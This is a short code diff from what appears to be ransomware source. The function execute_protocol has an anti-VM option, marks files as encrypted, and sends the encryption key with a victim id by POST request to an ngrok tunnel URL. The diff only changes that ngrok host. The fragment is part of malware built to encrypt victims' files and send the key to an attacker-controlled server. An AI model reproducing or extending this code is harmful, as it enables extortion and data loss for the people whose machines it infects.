@@ -112,7 +112,7 @@ def execute_protocol(antivm=True, send_post=True, executable=True):
                         print(full_path + ' -> [encrypted]')
         
         if send_post:
-            cm.send_post_request(url='http://204a586e623c.ngrok.io', id=str(id), key=cm.key)
+            cm.send_post_request(url='http://6d8a2ba5e132.ngrok.io', id=str(id), key=cm.key)
         else:
             cm.save_key_as_file(hidden=False)
 
